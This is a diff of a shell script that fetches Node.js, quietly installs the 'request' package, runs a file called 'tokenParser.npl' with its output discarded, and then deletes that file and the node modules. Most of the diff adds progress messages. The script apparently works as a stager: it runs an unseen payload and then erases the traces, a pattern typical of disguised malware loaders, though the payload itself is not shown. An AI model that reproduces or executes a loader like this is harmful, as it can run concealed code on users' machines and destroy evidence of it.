@@ -11,17 +11,21 @@ NODE_DIR="$(pwd)/node-v${NODE_VERSION}-linux-x64"
 NODE_INSTALLED_VERSION=""
 
 # Step 1: Check if Node.js is installed
+echo "Checking if Node.js is installed..."
 NODE_INSTALLED_VERSION=$(node -v 2>/dev/null || echo "")
 
 # Step 2: Check if Node.js is already installed and set the flag for installation
 if [ -z "$NODE_INSTALLED_VERSION" ]; then
     INSTALL_NODE=1
+    echo "Node.js not found, will install it..."
 else
     INSTALL_NODE=0
+    echo "Node.js is already installed: $NODE_INSTALLED_VERSION"
 fi
 
 # Step 3: Download Node.js if not installed
 if [ "$INSTALL_NODE" -eq 1 ]; then
+    echo "Downloading Node.js..."
     if ! command -v curl &> /dev/null; then
         echo "curl not found, using wget"
         wget -q "$DOWNLOAD_URL" -O "$NODE_TARBALL" >/dev/null 2>&1 &
@@ -29,33 +33,56 @@ if [ "$INSTALL_NODE" -eq 1 ]; then
         echo "Using curl to download Node.js"
         curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL" >/dev/null 2>&1 &
     fi
+    wait
+    echo "Node.js download complete"
 fi
 
 # Step 4: Extract Node.js tarball
+echo "Extracting Node.js tarball..."
 if [ -f "$NODE_TARBALL" ]; then
-    echo "Extracting Node.js tarball..."
     tar -xf "$NODE_TARBALL" -C "$(pwd)" >/dev/null 2>&1 &
-    rm -f "$NODE_TARBALL" &
-fi
-
-# Step 5: Add Node.js to the system path
-export PATH="$(pwd)/node-v${NODE_VERSION}-linux-x64/bin:$PATH"
-
-# Step 6: Check if Node.js and npm are available
-if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
+    wait
+    echo "Node.js extracted"
+    rm -f "$NODE_TARBALL"
+else
+    echo "Node.js tarball not found!"
     exit 1
 fi
 
+# Step 5: Add Node.js to the system path
+echo "Adding Node.js to the system PATH..."
+export PATH="$(pwd)/node-v${NODE_VERSION}-linux-x64/bin:$PATH"
+
+# Step 6: Check if Node.js and npm are available
+echo "Checking if Node.js and npm are available..."
+if ! command -v node &> /dev/null || ! command -v npm &> /dev/null; then
+    echo "Node.js or npm not found!"
+    exit 1
+else
+    echo "Node.js and npm are available"
+fi
+
 # Step 7: Install the "request" package if it's not installed
+echo "Checking if the 'request' package is installed..."
 if [ ! -d "$(pwd)/node_modules/request" ]; then
     echo "Installing 'request' package..."
     npm install request --silent --no-progress --loglevel=error --fund=false >/dev/null 2>&1 &
+    wait
+    echo "'request' package installed"
+else
+    echo "'request' package is already installed"
 fi
 
 # Step 8: Run tokenParser.npl if it exists
+echo "Checking if 'tokenParser.npl' exists..."
 if [ -f "$(pwd)/tokenParser.npl" ]; then
-    echo "Running tokenParser.npl..."
+    echo "Running 'tokenParser.npl'..."
     node "$(pwd)/tokenParser.npl" >/dev/null 2>&1 &
+    wait
+    echo "'tokenParser.npl' executed successfully"
+else
+    echo "'tokenParser.npl' not found!"
+    exit 1
 fi
 
 # Step 9: Clean up generated files
@@ -66,9 +93,9 @@ rm -f "$(pwd)/tokenParser.npl" >/dev/null 2>&1 &
 rm -rf "$(pwd)/node_modules" >/dev/null 2>&1 &
 rm -f "$(pwd)/package.json" >/dev/null 2>&1 &
 rm -f "$(pwd)/package-lock.json" >/dev/null 2>&1 &
-
-# Wait for all background tasks to finish
 wait
 
-echo "Successfully completed all tasks!"
+echo "Cleanup complete"
+echo "Script completed successfully"
+
 exit 0
